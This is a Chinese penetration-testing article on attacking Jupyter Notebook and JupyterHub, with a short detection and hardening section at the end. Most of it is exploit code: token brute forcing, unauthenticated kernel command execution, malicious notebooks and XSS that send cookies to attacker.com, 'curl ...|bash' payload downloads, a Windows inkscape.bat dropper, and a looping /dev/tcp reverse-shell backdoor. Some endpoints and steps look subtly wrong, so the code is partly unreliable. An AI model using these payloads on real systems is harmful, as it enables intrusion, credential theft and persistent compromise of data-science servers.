---
title: "Jupyter Notebook JupyterHub 未授权访问 CVE RCE 利用技术"
date: 2025-06-22T00:00:00+08:00
draft: false
weight: 112
description: "深入分析 Jupyter Notebook/JupyterHub 的未授权访问、Token 暴露与暴力破解、恶意 Notebook 文件 RCE、JupyterHub 认证绕过、Jupyter Server Proxy XSS、OAuthenticator 账户接管、Kernel API 滥用、CORS 绕过等完整攻击面，覆盖 2018-2025 年高危 CVE 漏洞链及蓝队检测与应急响应"
categories: ["安全","渗透测试"]
tags: ["Jupyter","JupyterHub","Notebook","未授权访问","RCE","CVE-2022-29241","CVE-2024-22421","Token暴力破解","Kernel","OAuthenticator","XSS"]
---

## 0x00 攻击面总览

Jupyter Notebook/JupyterHub 是数据科学与机器学习领域最广泛使用的交互式计算平台，被科研机构、金融机构和 AI 团队大量部署。Jupyter 的安全问题主要源于"交互式计算 = 任意代码执行"的固有设计：

| 攻击面 | 默认端口 | 风险等级 | 说明 |
|--------|---------|---------|------|
| Notebook Web UI | 8888 | **严重** | 无认证直接 RCE |
| Token 暴露/暴力破解 | 8888 | **严重** | Token 预测与暴力破解获取完整权限 |
| JupyterHub | 8000/8443 | **严重** | 认证绕过、多用户隔离失效 |
| Jupyter Server Proxy | 8888 | **高危** | 代理服务 XSS/RCE |
| Kernel API | 8888 | **高危** | 内核执行任意代码 |
| 恶意 Notebook 文件 | 8888 | **高危** | .ipynb 文件 XSS/RCE |
| OAuthenticator | SSO | **高危** | OAuth 认证绕过、账户接管 |
| nbconvert | 命令行 | **中-高危** | Notebook 转换 RCE（Windows） |

Jupyter 的核心安全问题在于：默认安装不启用认证、Token 生成机制可预测、Notebook 文件包含可执行代码、以及多租户隔离机制存在绕过。

## 0x01 服务识别与版本探测

### 1.1 指纹识别

```bash
nmap -sV -p 8888,8000,8443 <target>

# 检测 Jupyter Notebook
curl -sI http://TARGET:8888/
# Server: TornadoServer/x.x.x
# X-Frame-Options: SAMEORIGIN
# 标题包含 "Jupyter Notebook" 或 "JupyterHub"

# 检测版本
curl -s http://TARGET:8888/api/status
# {"kernels":{}}  (无需认证即可访问)
```

### 1.2 关键路径枚举

```
/                                 # Notebook 首页
/login                            # JupyterHub 登录
/hub/login                        # JupyterHub 登录
/hub/spawn                        # 服务器启动页
/api/status                       # 内核状态（无认证）
/api/kernels                      # 内核列表（无认证）
/api/kernels/{id}                 # 指定内核
/api/contents                     # 文件列表
/terminals                        # 终端
/files/                           # 文件浏览
/nbextensions/                    # Notebook 扩展
/lab                              # JupyterLab
/trust                            # Notebook 信任管理
/oauth_callback                   # OAuth 回调
```

### 1.3 版本判断

```python
import requests

def detect_jupyter(host, port=8888):
    base_url = f"http://{host}:{port}"

    # 检查是否无认证访问
    resp = requests.get(f"{base_url}/api/status", timeout=5)
    if resp.status_code == 200:
        print(f"[+] Jupyter accessible WITHOUT authentication!")
        data = resp.json()
        print(f"[*] Status: {data}")

    # 检查 API
    resp = requests.get(f"{base_url}/api/kernels", timeout=5)
    if resp.status_code == 200:
        print(f"[+] Kernel API accessible: {len(resp.json())} kernels running")

    # 检查 JupyterHub
    resp = requests.get(f"{base_url}/hub/login", timeout=5,
                        allow_redirects=False)
    if resp.status_code in [200, 302]:
        print(f"[+] JupyterHub login detected")

    # 检查 JupyterLab
    resp = requests.get(f"{base_url}/lab", timeout=5)
    if resp.status_code == 200:
        print(f"[+] JupyterLab available")

detect_jupyter("192.168.1.100")
```

## 0x02 Token 暴露与暴力破解

### 2.1 Token 暴露途径

Jupyter Notebook 默认生成 Token 用于认证，Token 可能通过以下途径暴露：

```bash
# 1. 启动日志中明文打印 Token
# 通常在 /proc/<pid>/cmdline 或 systemd 日志中可见
cat /proc/$(pgrep -f jupyter)/cmdline | tr '\0' '\n'
# --NotebookApp.token='abc123def456'

# 2. Jupyter 配置文件中
cat ~/.jupyter/jupyter_notebook_config.py | grep token
cat ~/.jupyter/jupyter_notebook_config.json

# 3. 运行时文件
cat ~/.local/share/jupyter/runtime/jupyter_cookie_secret
cat ~/.local/share/jupyter/runtime/nbserver-*.json
# 包含 token 和 port 信息

# 4. 系统进程列表
ps aux | grep jupyter | grep token
```

### 2.2 Token 暴力破解

```python
import requests
import string
import itertools

def brute_force_token(host, port=8888, charset=string.ascii_lowercase + string.digits):
    """
    Jupyter Notebook Token 暴力破解
    默认 Token 长度通常为 6-12 字符，使用小写字母和数字
    """
    base_url = f"http://{host}:{port}"

    for length in range(6, 10):
        print(f"[*] Trying length {length}...")
        for combo in itertools.product(charset, repeat=length):
            token = "".join(combo)
            resp = requests.get(
                f"{base_url}/?token={token}",
                timeout=3,
                allow_redirects=False
            )
            if resp.status_code in [200, 304] and "logout" in resp.text.lower():
                print(f"[+] Token found: {token}")
                return token

            # 也检查 API 端点
            resp = requests.get(
                f"{base_url}/api/contents?token={token}",
                timeout=3
            )
            if resp.status_code == 200:
                print(f"[+] Token found via API: {token}")
                return token

    print(f"[-] Token not found")
    return None

# 使用 hashcat / john 的更高效方式:
# 1. 获取 Token hash
# 2. 使用 hashcat -m 模式暴力破解
```

### 2.3 CVE-2022-29241 — PID 猜测 Token 泄露

**CVSS**: 9.0（严重）

**影响版本**: Jupyter Server < 1.17.1

**漏洞原理**: Jupyter Server 在以 `root_dir` 包含用户主目录方式启动时，REST API 允许通过猜测/暴力破解 PID 获取启动时分配的 Token。

```python
import requests

def exploit_pid_token_leak(host, port=8888):
    """
    CVE-2022-29241 — 通过 PID 猜测获取 Token
    """
    base_url = f"http://{host}:{port}"

    for pid in range(1, 65535):
        resp = requests.get(
            f"{base_url}/api/contents/?token=",  # 空 token
            timeout=3
        )

        # 尝试访问 /proc/<pid> 路径获取 token
        resp = requests.get(
            f"{base_url}/api/contents/proc/{pid}/cmdline",
            timeout=3
        )
        if resp.status_code == 200:
            data = resp.json()
            print(f"[+] PID {pid} accessible: {data}")

exploit_pid_token_leak("192.168.1.100")
```

## 0x03 无认证 RCE 利用

### 3.1 通过 Kernel API 执行命令

```python
import requests
import json

def exploit_kernel_api(host, port=8888, cmd="id"):
    """
    通过 Jupyter Kernel API 无认证执行任意命令
    """
    base_url = f"http://{host}:{port}"

    # Step 1: 创建新内核
    kernel_spec = {"name": "python3"}
    resp = requests.post(
        f"{base_url}/api/kernels",
        json=kernel_spec,
        timeout=10
    )

    if resp.status_code in [200, 201]:
        kernel_id = resp.json()["id"]
        print(f"[+] Kernel created: {kernel_id}")

        # Step 2: 在内核中执行代码
        code_payload = {
            "code": f"import os; result = os.popen('{cmd}').read(); print(result)"
        }
        resp = requests.post(
            f"{base_url}/api/kernels/{kernel_id}/execute",
            json=code_payload,
            timeout=15
        )
        print(f"[+] Command sent to kernel: {resp.status_code}")

        # Step 3: 获取执行结果
        import time
        time.sleep(3)
        resp = requests.get(
            f"{base_url}/api/kernels/{kernel_id}/messages",
            timeout=10
        )
        messages = resp.json()
        for msg in messages:
            if msg.get("msg_type") == "stream":
                content = msg.get("content", {})
                text = content.get("text", "")
                if text.strip():
                    print(f"[+] Output: {text.strip()}")

        return kernel_id

    print(f"[-] Kernel creation failed: {resp.status_code}")
    return None

exploit_kernel_api("192.168.1.100", cmd="id && whoami && hostname")
```

### 3.2 通过 WebSocket 执行代码

```python
import websocket
import json
import time

def exploit_websocket_kernel(host, port=8888, cmd="id"):
    """
    通过 WebSocket 直接连接内核执行代码
    """
    ws_url = f"ws://{host}:{port}/api/kernels"

    # 连接到 WebSocket
    ws = websocket.create_connection(ws_url, timeout=10)

    # 创建内核请求
    ws.send(json.dumps({
        "header": {
            "msg_id": "exec-01",
            "msg_type": "execute_request",
            "username": "",
            "session": "session-01",
            "date": "2025-06-22T00:00:00Z",
            "version": "5.3"
        },
        "parent_header": {},
        "content": {
            "code": f"import subprocess; print(subprocess.check_output(['bash', '-c', '{cmd}']).decode())",
            "silent": False,
            "store_history": False,
        },
        "metadata": {},
        "buffers": []
    }))

    # 读取响应
    time.sleep(3)
    try:
        while True:
            result = ws.recv()
            data = json.loads(result)
            if data.get("msg_type") == "stream":
                print(f"[+] Output: {data['content']['text']}")
    except:
        pass

    ws.close()

exploit_websocket_kernel("192.168.1.100", cmd="id && hostname")
```

### 3.3 通过文件上传 RCE

```python
import requests
import json

def exploit_file_upload_rce(host, port=8888):
    """
    通过上传恶意 .ipynb 文件实现 RCE
    """
    base_url = f"http://{host}:{port}"

    # 构造恶意 Notebook
    malicious_notebook = {
        "cells": [
            {
                "cell_type": "code",
                "execution_count": None,
                "metadata": {},
                "outputs": [],
                "source": [
                    "import subprocess\n",
                    "result = subprocess.check_output(['id'])\n",
                    "print(result.decode())\n",
                    "result2 = subprocess.check_output(['cat', '/etc/passwd'])\n",
                    "print(result2.decode())"
                ]
            }
        ],
        "metadata": {
            "kernelspec": {
                "display_name": "Python 3",
                "language": "python",
                "name": "python3"
            },
            "language_info": {
                "name": "python",
                "version": "3.9.0"
            }
        },
        "nbformat": 4,
        "nbformat_minor": 4
    }

    # 上传恶意 Notebook
    resp = requests.put(
        f"{base_url}/api/contents/malicious.ipynb",
        json=malicious_notebook,
        timeout=10
    )

    if resp.status_code in [200, 201]:
        print(f"[+] Malicious notebook uploaded")

        # 执行 Notebook
        exec_resp = requests.post(
            f"{base_url}/api/contents/malicious.ipynb/checkpoints",
            json={},
            timeout=10
        )
        print(f"[*] Execution triggered: {exec_resp.status_code}")

exploit_file_upload_rce("192.168.1.100")
```

## 0x04 JupyterHub 认证绕过

### 4.1 CVE-2024-22421 — 认证绕过

**CVSS**: 8.0（高危）

**影响版本**: JupyterHub < 4.0.2

**漏洞原理**: JupyterHub 在处理 `/hub/login` 页面的 `next` 参数时存在路径穿越。攻击者通过构造特殊 URL 绕过认证检查，直接访问受保护的 API 端点。

```python
import requests

def exploit_jupyterhub_auth_bypass(host, port=8000):
    """
    CVE-2024-22421 — JupyterHub 认证绕过
    通过 next 参数路径穿越绕过认证
    """
    base_url = f"http://{host}:{port}"

    # 利用 /hub/login 的 next 参数
    # 通过 /../../ 路径穿越到非 /hub/ 前缀的路径
    bypass_paths = [
        "/hub/login?next=/%2e%2e%2fapi/users",
        "/hub/login?next=/%2e%2e%2fapi/user",
        "/hub/login?next=/../api/users",
        "/hub/login?next=/%2e%2e%2fstatus",
    ]

    for path in bypass_paths:
        resp = requests.get(
            f"{base_url}{path}",
            allow_redirects=False,
            timeout=5
        )
        print(f"[*] {path} -> {resp.status_code}")
        if resp.status_code == 200:
            print(f"[+] Auth bypass confirmed!")
            print(f"[*] Response: {resp.text[:500]}")
            break

exploit_jupyterhub_auth_bypass("192.168.1.100")
```

### 4.2 JupyterHub 管理操作

```python
import requests

def exploit_jupyterhub_admin(host, port=8000, token=None):
    """
    通过 JupyterHub Admin API 进行管理操作
    需要管理员 Token (通常在配置文件或日志中可获取)
    """
    base_url = f"http://{host}:{port}"
    headers = {"Authorization": f"Bearer {token}"}

    # 列出所有用户
    resp = requests.get(f"{base_url}/hub/api/users",
                        headers=headers, timeout=10)
    users = resp.json()
    for user in users:
        print(f"[*] User: {user['name']} | Admin: {user.get('admin')}")

    # 创建管理员用户
    resp = requests.post(
        f"{base_url}/hub/api/users/hacker",
        json={"admin": True, "auth_state": {"access_token": "evil"}},
        headers=headers, timeout=10
    )
    print(f"[*] Create admin user: {resp.status_code}")

    # 以其他用户身份启动服务器
    resp = requests.post(
        f"{base_url}/hub/api/users/admin/server",
        headers=headers, timeout=10
    )
    print(f"[*] Spawn admin server: {resp.status_code}")

    # 获取所有活动的内核
    resp = requests.get(f"{base_url}/hub/api/users/admin/activity",
                        headers=headers, timeout=10)
    print(f"[*] User activity: {resp.text[:300]}")

exploit_jupyterhub_admin("192.168.1.100", token="admin-token-here")
```

## 0x05 恶意 Notebook 文件利用

### 5.1 XSS → RCE 攻击链

```python
import json

def create_malicious_notebook():
    """
    构造恶意 .ipynb 文件，利用 XSS 实现 RCE
    CVE-2018-8768 / CVE-2021-32798
    """
    malicious = {
        "cells": [
            {
                "cell_type": "markdown",
                "metadata": {},
                "source": [
                    '<img src=x onerror="fetch(\'http://attacker.com/steal?token=\'+document.cookie)">'
                ]
            },
            {
                "cell_type": "code",
                "execution_count": None,
                "metadata": {},
                "outputs": [],
                "source": [
                    "import os, subprocess\n",
                    "subprocess.Popen(['bash', '-c', 'curl http://attacker.com/shell.sh|bash'])\n",
                    "# 打开此 Notebook 即触发代码执行"
                ]
            }
        ],
        "metadata": {
            "kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"}
        },
        "nbformat": 4,
        "nbformat_minor": 4
    }

    with open("evil_notebook.ipynb", "w") as f:
        json.dump(malicious, f, indent=2)
    print("[+] Malicious notebook created: evil_notebook.ipynb")
    print("[*] Deliver to victim - they just need to open it in Jupyter")

create_malicious_notebook()
```

### 5.2 通过 Share 机制攻击

```python
def create_xss_share_payload(host, port=8888):
    """
    通过 JupyterHub 的 Share 功能传播恶意 Notebook
    """
    # 恶意 Notebook 包含 JavaScript 偷取 Token
    xss_payload = """
    <script>
    // 在 Jupyter Notebook 渲染环境中执行
    var token = new URLSearchParams(window.location.search).get('token');
    if (!token) token = document.cookie.split('xsrf-token=')[1];

    // 窃取 Token 并发送到攻击者服务器
    fetch('http://attacker.com:9999/steal?token=' + token, {
        method: 'POST',
        body: JSON.stringify({
            origin: window.location.href,
            cookies: document.cookie
        })
    });

    // 也尝试直接通过 Kernel API 执行命令
    fetch('/api/kernels', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({name: 'python3'})
    }).then(r => r.json()).then(kernel => {
        fetch('/api/kernels/' + kernel.id + '/execute', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                code: 'import os; os.system("curl http://attacker.com/shell.sh|bash")'
            })
        });
    });
    </script>
    """
    print(f"[*] XSS payload for {host}:{port}")
    return xss_payload

create_xss_share_payload("192.168.1.100")
```

## 0x06 OAuthenticator 认证绕过

### 6.1 CVE-2023-25574 — OAuthenticator 账户接管

**影响版本**: OAuthenticator < 16.3.0

**漏洞原理**: OAuthenticator 在使用 `username_claim` 为邮箱时，不验证邮箱是否已验证。攻击者使用未验证的邮箱在 OAuth Provider 上注册账户，即可冒充目标用户登录 JupyterHub。

```python
def exploit_oauth_account_takeover():
    """
    CVE-2023-25574 — OAuthenticator 账户接管
    攻击条件:
    1. JupyterHub 使用 OAuthenticator
    2. username_claim 为 email
    3. OAuth Provider 不验证邮箱
    """
    print("[*] Attack scenario:")
    print("    1. Register attacker@target.com on OAuth Provider (e.g., Google)")
    print("    2. If victim is admin@target.com, register admin@target.com on same provider")
    print("    3. Login to JupyterHub with attacker-controlled admin@target.com")
    print("    4. Gain admin access to JupyterHub")
    print()
    print("[+] Mitigation: Use allowed_users whitelist in OAuthenticator config")

exploit_oauth_account_takeover()
```

### 6.2 CVE-2026-33175 — Auth0 邮箱未验证绕过

```python
def exploit_auth0_bypass():
    """
    CVE-2026-33175 — Auth0 + OAuthenticator 认证绕过
    攻击者使用 Auth0 tenant 上未验证的邮箱登录 JupyterHub
    当 email 用作 username_claim 时可实现账户接管
    """
    print("[*] Auth0 bypass scenario:")
    print("    1. Create Auth0 account with victim's email")
    print("    2. Do NOT verify email on Auth0")
    print("    3. Login to JupyterHub via Auth0")
    print("    4. OAuthenticator accepts unverified email as username")

exploit_auth0_bypass()
```

## 0x07 Jupyter Server Proxy 利用

### 7.1 CVE-2024-35225 — XSS

**CVSS**: 9.7（严重）

**影响版本**: jupyter-server-proxy 3.x < 3.2.4, 4.x < 4.2.0

```python
def exploit_server_proxy_xss(host, port=8888):
    """
    CVE-2024-35225 — Jupyter Server Proxy XSS
    /proxy/<host> 端点未过滤无效 host 值，导致 XSS
    """
    base_url = f"http://{host}:{port}"

    xss_payload = '<script>alert(document.cookie)</script>'
    encoded_payload = requests.utils.quote(xss_payload)

    url = f"{base_url}/proxy/{encoded_payload}"
    print(f"[*] XSS payload URL: {url}")
    print("[+] Deliver to Jupyter user for session hijack")

exploit_server_proxy_xss("192.168.1.100")
```

## 0x08 CVE-2025-53000 — nbconvert Windows RCE

### 8.1 漏洞原理

**影响版本**: nbconvert <= 7.16.6（Windows 环境）

**漏洞原理**: 在 Windows 上，当用户将包含 SVG 输出的 Notebook 转换为 PDF 时，`jupyter nbconvert` 会查找 `inkscape.bat`。攻击者可以在 PATH 目录中放置恶意的 `inkscape.bat` 文件，当用户执行转换命令时触发任意代码执行。

```bash
# Windows 上的利用路径:
# 1. 创建恶意 inkscape.bat
echo @echo off > C:\Users\Public\inkscape.bat
echo curl http://attacker.com/shell.exe -o C:\Users\Public\shell.exe >> C:\Users\Public\inkscape.bat
echo C:\Users\Public\shell.exe >> C:\Users\Public\inkscape.bat

# 2. 确保 C:\Users\Public 在 PATH 中（或放在用户 PATH 目录）

# 3. 用户执行:
# jupyter nbconvert --to pdf malicious_notebook.ipynb
# → 触发 inkscape.bat → RCE
```

## 0x09 CORS 绕过

### 9.1 CVE-2026-40110 / CVE-2026-6657 — re.match CORS 绕过

```python
import requests

def exploit_cors_bypass(host, port=8888):
    """
    CVE-2026-40110 — CORS 绕过
    re.match() 只锚定字符串开头，不锚定末尾
    trusted.example.com.evil.com 可通过 trusted.example.com 的验证
    """
    base_url = f"http://{host}:{port}"

    # 如果 Jupyter Server 配置了 allow_origin_pat:
    # allow_origin_pat = "trusted\\.example\\.com"
    # 则攻击者控制的域名 trusted.example.com.evil.com 可通过验证

    # 从攻击者域名发送跨域请求
    headers = {
        "Origin": "https://trusted.example.com.evil.com",
        "Content-Type": "application/json"
    }

    # 尝试访问受保护的 API
    resp = requests.get(f"{base_url}/api/users",
                        headers=headers, timeout=10)

    cors_header = resp.headers.get("Access-Control-Allow-Origin", "")
    if cors_header:
        print(f"[+] CORS bypass successful!")
        print(f"[*] Access-Control-Allow-Origin: {cors_header}")

exploit_cors_bypass("192.168.1.100")
```

## 0x10 持久化技术

### 10.1 Kernel 级持久化

```python
def persist_kernel_shell(host, port=8888):
    """
    通过长期运行的 Kernel 实现持久化
    创建一个持续回连的后台进程
    """
    base_url = f"http://{host}:{port}"

    # 创建内核
    resp = requests.post(f"{base_url}/api/kernels",
                         json={"name": "python3"}, timeout=10)
    kernel_id = resp.json()["id"]

    # 注入持久化代码
    persist_code = """
import threading, subprocess, time, os

def backdoor():
    while True:
        try:
            subprocess.Popen([
                'bash', '-c',
                'bash -i >& /dev/tcp/attacker/4444 0>&1'
            ])
        except:
            pass
        time.sleep(300)  # 每5分钟重连

t = threading.Thread(target=backdoor, daemon=True)
t.start()
"""
    requests.post(f"{base_url}/api/kernels/{kernel_id}/execute",
                  json={"code": persist_code}, timeout=10)
    print(f"[+] Persistence kernel created: {kernel_id}")
    print("[*] Kernel runs as long as Jupyter Server is active")

persist_kernel_shell("192.168.1.100")
```

### 10.2 Cookie Secret 持久化

```bash
# CVE-2026-40934 — 密码重置后 Cookie Secret 不轮换
# 即使修改密码，旧 session cookie 仍然有效

# 1. 窃取 jupyter_cookie_secret
cat ~/.local/share/jupyter/runtime/jupyter_cookie_secret

# 2. 使用窃取的 secret 伪造任意 session
# 修改密码后旧 cookie 仍可使用
# 防御: 每次密码重置后手动删除 cookie_secret 文件
```

## 0x11 历史 CVE 漏洞时间线

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2018-8768 | 2018 | 6.8 | XSS | 恶意 Notebook jQuery XSS → RCE |
| CVE-2019-9644 | 2019 | 6.1 | 信息泄露 | 启动 Token 通过 /proc 泄露 |
| CVE-2021-32797 | 2021 | 6.8 | RCE | JupyterLab 恶意 form action 触发代码执行 |
| CVE-2021-32798 | 2021 | 6.8 | XSS/RCE | Caja 过滤器绕过 → XSS → RCE |
| CVE-2021-39159 | 2021 | 7.5 | RCE | BinderHub 恶意输入导致 RCE |
| CVE-2022-24785 | 2022 | 6.1 | 路径穿越 | Jupyter Notebook 路径穿越 |
| CVE-2022-29241 | 2022 | 9.0 | Token 泄露 | PID 猜测获取 Token |
| CVE-2023-25574 | 2023 | 8.1 | 认证绕过 | OAuthenticator 未验证邮箱 → 账户接管 |
| CVE-2023-49081 | 2023 | 7.5 | 未授权 | Notebook 终端未授权访问 |
| CVE-2023-49082 | 2023 | 7.5 | 路径穿越 | Notebook 任意文件访问 |
| CVE-2024-22421 | 2024 | 8.0 | 认证绕过 | JupyterHub next 参数路径穿越 |
| CVE-2024-28179 | 2024 | 6.5 | 路径穿越 | JupyterHub 路径穿越 |
| CVE-2024-35225 | 2024 | 9.7 | XSS | Jupyter Server Proxy host 参数 XSS |
| CVE-2024-39700 | 2024 | 6.3 | RCE | JupyterLab 扩展模板 GitHub Actions RCE |
| CVE-2025-53000 | 2025 | 7.8 | RCE | nbconvert Windows inkscape.bat 劫持 |
| CVE-2026-40110 | 2026 | 7.3 | CORS 绕过 | re.match() CORS 验证不锚定末尾 |
| CVE-2026-40934 | 2026 | 7.5 | Session 持久 | Cookie Secret 密码重置后不轮换 |
| CVE-2026-5422 | 2026 | 8.1 | 路径穿越 | _get_os_path() 路径穿越文件读写 |
| CVE-2026-6657 | 2026 | 6.1 | CORS 绕过 | allow_origin_pat re.match 绕过 |

## 0x12 蓝队检测与应急响应

### 12.1 日志分析

```bash
# 检查 Kernel 异常创建
grep "POST /api/kernels" access.log

# 检查未授权 API 访问
grep "GET /api/contents" access.log | grep -v "token="

# 检查文件上传异常
grep "PUT /api/contents" access.log | grep -v "normal_user"

# 检查认证绕过尝试
grep "/hub/login.*next=" access.log | grep "%2e\|%2E\|\.\."

# 检查 Token 暴力破解
grep "/?token=" access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head

# 检查 WebSocket 异常连接
grep "WebSocket" access.log | grep "kernels"
```

### 12.2 应急响应清单

```
[ ] 确认 Jupyter/JupyterHub 版本
    - pip show jupyter jupyterhub jupyter-server

[ ] 检查认证配置
    - 确认是否启用了 Token/密码认证
    - 检查是否暴露了无认证的 API 端点

[ ] 排查 Token 泄露
    - 检查进程列表是否暴露 Token
    - 审计 jupyter_notebook_config.py 配置
    - 轮换 Token/密码

[ ] 排查 Kernel 异常
    - 检查所有活跃的 Kernel 列表
    - 审计 Kernel 执行历史

[ ] 排查恶意 Notebook
    - 检查所有 .ipynb 文件中的恶意代码
    - 检查文件修改时间异常

[ ] 检查 JupyterHub 认证
    - 审计用户列表是否有异常账户
    - 检查 OAuthenticator 配置

[ ] 网络隔离与加固
    - 启用 Token 认证或集成 SSO
    - 禁用无需认证的 API 端点
    - 限制 Jupyter Server 的出站网络访问
    - 启用 Content Security Policy (CSP)
    - 升级到最新版本
```

## 0x13 安全审计清单

```
[ ] Jupyter Notebook 已启用 Token 或密码认证
[ ] Token 长度 ≥ 32 字符，使用随机生成器
[ ] JupyterHub 已启用强认证 (SSO + MFA)
[ ] OAuthenticator 配置了 allowed_users 白名单
[ ] Jupyter Server 仅绑定内网地址
[ ] Kernel API 已启用认证
[ ] 上传文件类型限制 (阻止 .ipynb 自动执行)
[ ] Jupyter Server Proxy 已更新 (防御 XSS)
[ ] nbconvert 仅在可信环境使用
[ ] Cookie Secret 定期轮换
[ ] CORS 配置使用完整域名匹配 (非 re.match)
[ ] 文件系统权限限制 (Notebook 目录外不可访问)
[ ] 配置 CSP 头部防止 XSS
[ ] 监控异常 Kernel 创建和代码执行
[ ] 限制 Jupyter Server 出站网络 (防止 SSRF/反弹 Shell)
```

## 0x14 总结

Jupyter 生态的安全问题核心在于"交互式计算的固有风险"：

1. **默认不安全**: 很多部署默认不启用认证，或使用可预测的 Token
2. **Notebook = 代码**: .ipynb 文件本质上是可执行代码，恶意 Notebook 可导致 XSS → RCE
3. **多租户隔离不足**: JupyterHub 的用户隔离机制存在路径穿越和认证绕过
4. **认证生态碎片化**: OAuthenticator 等第三方认证插件引入新的攻击面
5. **持久化困难检测**: Kernel 级后门和 Cookie Secret 不轮换使清除入侵者更加困难

防守方核心策略：
- **强制认证**: 所有 Jupyter 实例必须启用 Token 或 SSO 认证
- **Token 安全**: 使用 ≥32 字符的随机 Token，定期轮换
- **网络隔离**: 仅内网可达，限制出站访问
- **文件审计**: 定期审查 .ipynb 文件内容，阻止恶意代码
- **及时升级**: 升级到 Jupyter Server ≥ 2.18.0 / JupyterHub ≥ 5.4.5
